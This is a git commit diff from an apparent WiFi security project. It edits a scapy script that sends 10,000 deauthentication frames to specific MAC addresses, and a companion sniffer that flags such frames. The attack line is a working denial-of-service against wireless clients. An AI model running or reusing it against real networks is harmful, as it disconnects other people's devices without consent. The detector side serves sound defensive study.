8163bb45e66517f274558d8e4f44ebcae35b80fd
sergey <sergeyr1991@gmail.com>
2020-09-21 15:09:53 +0300

    fix defence

--- deAuth_attack.py
+++ deAuth_attack.py
@@ -5,4 +5,4 @@ from scapy.all import *
 
 # Manually deauth packet send
 pkt = RadioTap() / Dot11(addr1 = "80:a5:89:09:d5:c5", addr2 = "98:1E:19:7B:4D:8E", addr3="98:1E:19:7B:4D:8E") / Dot11Deauth()
-sendp(pkt, iface="wlp0s20f0u3", count=10000, inter=.2)
+sendp(pkt, iface="wlp0s20f0u1", count=10000, inter=.2)
--- deAuth_defence.py
+++ deAuth_defence.py
@@ -3,11 +3,8 @@ from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
 
 
 def PacketHandler( pkt ):
-    deAuth_pkt_count = 0
     if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 0xC:
-        deAuth_pkt_count += 1
-        if(deAuth_pkt_count >= 20):
-            print("YOU'R DEVICE IS UNDER ATTACK!!")
+        print("deAuth packet sniffed!!")
 
 sniff(iface="wlp0s20f0u1", prn = PacketHandler)
 
